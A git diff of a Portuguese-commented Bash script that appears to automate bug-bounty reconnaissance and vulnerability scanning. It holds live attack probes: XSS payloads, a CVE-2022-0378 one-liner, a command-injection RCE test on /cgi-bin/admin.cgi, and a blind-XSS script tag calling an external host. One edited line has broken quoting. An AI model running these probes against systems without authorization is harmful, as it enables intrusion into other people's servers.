@@ -68,8 +68,9 @@ echo -e "\e[1;31m$(wc -l < "$folder/subfinder_tmp.txt")\e[0m"
 # Executando amass para encontrar subdomínios
 echo -e "\e[33mRunning amass\e[0m"
 amass enum -passive -norecursive -d "$domain" -o "$folder/amass_tmp.txt"
+cat "$folder/amass_tmp.txt" | oam_subs -names -d "$domain" > "$folder/amass_tmp2.txt"
 # Contar as linhas do arquivo 
-echo -e "\e[1;31m$(wc -l < "$folder/amass_tmp.txt")\e[0m"
+echo -e "\e[1;31m$(wc -l < "$folder/amass_tmp2.txt")\e[0m"
 
 # Executando Findomain
 echo -e "\e[33mRunning Findomain\e[0m"
@@ -122,7 +123,7 @@ echo -e "\e[1;31m$(wc -l < "$folder/center_tmp.txt")\e[0m"
 # Executando Sublist3r
 # colocar caminho Sublist3r
 echo -e "\e[33mRunning Sublist3r\e[0m"
-python3 ~/Sublist3r/sublist3r.py -d "$domain" -v -o "$folder/Sublist3r_tmp.txt"
+python3 ~/tools/Sublist3r/sublist3r.py -d "$domain" -v -o "$folder/Sublist3r_tmp.txt"
 # Contar as linhas do arquivo 
 echo -e "\e[1;31m$(wc -l < "$folder/Sublist3r_tmp.txt")\e[0m"
 
@@ -170,9 +171,9 @@ echo -e "\e[1;31m$(wc -l < "$folder/RapidDNS_tmp.txt")\e[0m"
 
 # Limpando e ordenando subdomínios
 echo -e "\e[33mCleaning and sorting subdomains\e[0m"
-cat "$folder/subfinder_tmp.txt" "$folder/amass_tmp.txt" "$folder/Findomain_tmp.txt" "$folder/Assetfinder_tmp.txt" "$folder/Sublist3r_tmp.txt" "$folder/jldc_tmp.txt" "$folder/wayback_tmp.txt" "$folder/crt_tmp.txt" "$folder/abuseipdb_tmp.txt" "$folder/alienvault_tmp.txt" "$folder/urlscan_tmp.txt" "$folder/RapidDNS_tmp.txt" "$folder/chaos_tmp.txt" "$folder/gau_tmp.txt" "$folder/github_tmp.txt" "$folder/gitlab_tmp.txt" "$folder/cero_temp.txt" "$folder/center_tmp.txt" > "$folder/subdomains_tmp1.txt"
+cat "$folder/subfinder_tmp.txt" "$folder/amass_tmp2.txt" "$folder/Findomain_tmp.txt" "$folder/Assetfinder_tmp.txt" "$folder/Sublist3r_tmp.txt" "$folder/jldc_tmp.txt" "$folder/wayback_tmp.txt" "$folder/crt_tmp.txt" "$folder/abuseipdb_tmp.txt" "$folder/alienvault_tmp.txt" "$folder/urlscan_tmp.txt" "$folder/RapidDNS_tmp.txt" "$folder/chaos_tmp.txt" "$folder/gau_tmp.txt" "$folder/github_tmp.txt" "$folder/gitlab_tmp.txt" "$folder/cero_temp.txt" "$folder/center_tmp.txt" > "$folder/subdomains_tmp1.txt"
 sort -u "$folder/subdomains_tmp1.txt" > "$folder/subdomains.txt"
-rm "$folder/subfinder_tmp.txt" "$folder/amass_tmp.txt" "$folder/Findomain_tmp.txt" "$folder/Assetfinder_tmp.txt" "$folder/Sublist3r_tmp.txt" "$folder/jldc_tmp.txt" "$folder/wayback_tmp.txt" "$folder/crt_tmp.txt" "$folder/abuseipdb_tmp.txt" "$folder/alienvault_tmp.txt" "$folder/urlscan_tmp.txt" "$folder/RapidDNS_tmp.txt" "$folder/chaos_tmp.txt" "$folder/gau_tmp.txt" "$folder/github_tmp.txt" "$folder/gitlab_tmp.txt" "$folder/cero_temp.txt" "$folder/center_tmp.txt"
+rm "$folder/subfinder_tmp.txt" "$folder/amass_tmp.txt" "$folder/amass_tmp2.txt" "$folder/Findomain_tmp.txt" "$folder/Assetfinder_tmp.txt" "$folder/Sublist3r_tmp.txt" "$folder/jldc_tmp.txt" "$folder/wayback_tmp.txt" "$folder/crt_tmp.txt" "$folder/abuseipdb_tmp.txt" "$folder/alienvault_tmp.txt" "$folder/urlscan_tmp.txt" "$folder/RapidDNS_tmp.txt" "$folder/chaos_tmp.txt" "$folder/gau_tmp.txt" "$folder/github_tmp.txt" "$folder/gitlab_tmp.txt" "$folder/cero_temp.txt" "$folder/center_tmp.txt"
 rm "$folder/subdomains_tmp1.txt"
 echo -e "\e[1;31m$(wc -l < "$folder/subdomains.txt")\e[0m"
 
@@ -212,7 +213,7 @@ echo -e "\e[1;31m$(wc -l < "$folder/EndpointsWay.txt")\e[0m"
 # Executando gospider
 echo -e "\e[33mExecutando gospider...\e[0m"
 gospider -S "$folder/live_subdomains.txt" -o "$folder/output" -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg)" --other-source 
-cat "$folder/output/*" | grep -e "code-200" | awk '{print $5}' | anew "$folder/EndpointsGos.txt"
+cat "$folder/output/"*" | grep -e "code-200" | awk '{print $5}' | anew "$folder/EndpointsGos.txt"
 rm -r "$folder/output"
 echo -e "\e[1;31m$(wc -l < "$folder/EndpointsGos.txt")\e[0m"
 
@@ -284,16 +285,10 @@ echo -e "\e[32mExecutando Testes de Vulnerabilidade\e[0m"
 
 # teste xss
 echo -e "\e[32mExecutando qsreplace xss...\e[0m"
-cat "$folder/xss.txt" | uro | grep "=" | qsreplace '"><img src=x onerror=alert(1);>' | airixss -payload "alert(1)" | egrep -v 'Not' > "$folder/qsreplaceVul.txt"
+cat "$folder/xss.txt" | uro | grep "=" | qsreplace '<img src=x onerror=alert(document.domain)>' | airixss -payload "alert(document.domain)" | egrep -v 'Not' > "$folder/qsreplaceVul.txt"
 echo -e "\e[1;31m$(wc -l < "$folder/qsreplaceVul.txt")\e[0m"
 
 # One-line test
-# Prototype Pollution One-line
-echo -e "\e[32mPrototype Pollution One-line\e[0m"
-httpx -l "$folder/subdomains.txt" -threads 200 | anew -q FILE.txt && sed 's/$/\/?_proto_[testparam]=exploit\//' FILE.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOTVULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE" > "$folder/PrototypeP.txt"      
-rm FILE.txt
-echo -e "\e[1;31m$(wc -l < "$folder/PrototypeP.txt")\e[0m"
-
 # One-line CVE-2022-0378
 echo -e "\e[32mCVE-2022-0378 One-line\e[0m"
 cat "$folder/live_subdomains.txt" | while read h do; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"| grep -qs "onmouse" && echo "$h: VULNERABLE - URL: $h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"; done > "$folder/CVE-2022-0378.txt"
@@ -301,14 +296,14 @@ echo -e "\e[1;31m$(wc -l < "$folder/CVE-2022-0378.txt")\e[0m"
 
 # One-line Rce
 echo -e "\e[32mRCE One-line\e[0m"
-cat "$folder/subdomains.txt" | httpx -path "/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id" -nc -ports 80,443,8080,8443 -mr "uid=" -silent | grep -q "uid=" && echo "$h: VULNERABLE" > "$folder/RceOneline.txt"
+cat "$folder/live_subdomains.txt" | httpx -path "/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id" -nc -ports 80,443,8080,8443 -mr "uid=" -silent | grep -q "uid=" && echo "$h: VULNERABLE" > "$folder/RceOneline.txt"
 echo -e "\e[1;31m$(wc -l < "$folder/RceOneline.txt")\e[0m"
 
 # takeover vulnerabilities
 # criar caminho e add o arquivo abaixo
 #https://raw.githubusercontent.com/haccer/subjack/master/fingerprints.json
 echo -e "\e[32mExecutando takeover Vulnerabilit\e[0m"
-subjack -w "$folder/subdomains.txt" -t 20 -a -o "$folder/takeover.txt" -ssl
+subjack -w "$folder/live_subdomains.txt" -t 20 -a -o "$folder/takeover.txt" -ssl
 echo -e "\e[1;31m$(wc -l < "$folder/takeover.txt")\e[0m"
 
 # openredirect
@@ -324,11 +319,14 @@ echo -e "\e[1;31m$(wc -l < "$folder/crlfVul.txt")\e[0m"
 
 # dalfox
 echo -e "\e[32mExecutando dalfox Vulnerabilit\e[0m"
-dalfox file "$folder/XSS_Ref.txt" --skip-mining-all -b 'https://mrxbugcom.bxss.in' -o "$folder/Vulnerable_XSS.txt"
+dalfox file "$folder/XSS_Ref.txt" --skip-mining-all -b '<script src=https://mrxbugcom.bxss.in></script>' -o "$folder/Vulnerable_XSS.txt"
 
 # nuclei exposures JS
 echo -e "\e[32mExecutando nuclei JS Vulnerabilit\e[0m"
-nuclei -l "$folder/JS.txt" -t ~/nuclei-templates/http/exposures/ -o "$folder/js_Vul.txt"
+cat "$folder/EndpointsL.txt" | uro | grep -iE '.js'| grep -iEv '(.jsp|.json)' | anew "$folder/js1.txt"
+cat "$folder/js1.txt" "$folder/JS.txt" | anew "$folder/JS3.txt"
+rm "$folder/js1.txt" "$folder/JS.txt"
+nuclei -l "$folder/JS3.txt" -t ~/nuclei-templates/http/exposures/ -o "$folder/js_Vul.txt"
 
 # nuclei
 echo -e "\e[32mExecutando nuclei Vulnerabilit\e[0m"
